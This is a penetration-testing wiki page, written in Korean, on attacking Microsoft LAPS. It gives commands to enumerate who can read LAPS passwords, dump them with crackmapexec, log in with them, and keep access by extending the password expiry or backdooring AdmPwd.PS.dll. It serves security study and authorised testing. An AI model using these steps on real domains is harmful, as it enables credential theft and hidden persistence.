# LAPS

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## 기본 정보

Local Administrator Password Solution (LAPS)는 **관리자 비밀번호**를 관리하는 도구로, 이 비밀번호는 **고유하고 무작위이며 자주 변경**됩니다. 이 비밀번호는 도메인에 가입된 컴퓨터에 적용됩니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, Access Control Lists (ACLs)를 통해 권한이 부여된 사용자만 접근할 수 있습니다. 클라이언트에서 서버로의 비밀번호 전송 보안은 **Kerberos version 5**와 **Advanced Encryption Standard (AES)**를 사용하여 보장됩니다.

도메인의 컴퓨터 객체에서 LAPS의 구현은 두 개의 새로운 속성인 **`ms-mcs-AdmPwd`**와 **`ms-mcs-AdmPwdExpirationTime`**의 추가로 이어집니다. 이 속성들은 각각 **일반 텍스트 관리자 비밀번호**와 **만료 시간**을 저장합니다.

### 활성화 여부 확인
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS 비밀번호 접근

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`에서 **원시 LAPS 정책을 다운로드**한 다음, [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 패키지의 **`Parse-PolFile`**을 사용하여 이 파일을 사람이 읽을 수 있는 형식으로 변환할 수 있습니다.

또한, **네이티브 LAPS PowerShell cmdlets**는 우리가 접근할 수 있는 머신에 설치되어 있다면 사용할 수 있습니다:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView**는 **누가 비밀번호를 읽을 수 있는지와 그것을 읽는지** 알아내는 데에도 사용될 수 있습니다:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)는 여러 기능을 통해 LAPS의 열거를 용이하게 합니다.\
하나의 기능은 **LAPS가 활성화된 모든 컴퓨터에 대한 `ExtendedRights`**를 파싱하는 것입니다. 이는 **LAPS 비밀번호를 읽도록 특별히 위임된 그룹**을 보여주며, 이러한 그룹은 종종 보호된 그룹의 사용자입니다.\
**도메인에 컴퓨터를 가입시킨 계정**은 해당 호스트에 대한 `All Extended Rights`를 받으며, 이 권한은 **비밀번호를 읽을 수 있는 능력**을 부여합니다. 열거를 통해 호스트에서 LAPS 비밀번호를 읽을 수 있는 사용자 계정을 보여줄 수 있습니다. 이는 LAPS 비밀번호를 읽을 수 있는 **특정 AD 사용자**를 **타겟팅하는 데** 도움이 될 수 있습니다.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**

powershell에 접근할 수 없는 경우, LDAP를 사용하여 이 권한을 원격으로 악용할 수 있습니다.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
이것은 사용자가 읽을 수 있는 모든 비밀번호를 덤프하여 다른 사용자로 더 나은 발판을 마련할 수 있게 해줍니다.

## ** LAPS 비밀번호 사용 **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS 지속성**

### **만료 날짜**

관리자가 되면, **비밀번호를 얻고** **업데이트**를 **방지**하기 위해 **만료 날짜를 미래로 설정**할 수 있습니다.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> 비밀번호는 **admin**이 **`Reset-AdmPwdPassword`** cmdlet을 사용할 경우 여전히 재설정됩니다. 또는 LAPS GPO에서 **정책에 의해 요구되는 것보다 긴 비밀번호 만료 시간을 허용하지 않음**이 활성화된 경우에도 마찬가지입니다.

### 백도어

LAPS의 원본 소스 코드는 [여기](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으며, 따라서 코드에 백도어를 삽입하는 것이 가능합니다 (예: `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부) 이 백도어는 어떤 식으로든 **새 비밀번호를 유출하거나 어딘가에 저장**할 수 있습니다.

그런 다음, 새로운 `AdmPwd.PS.dll`을 컴파일하고 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`에 업로드합니다 (그리고 수정 시간을 변경합니다).

## 참고문헌

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
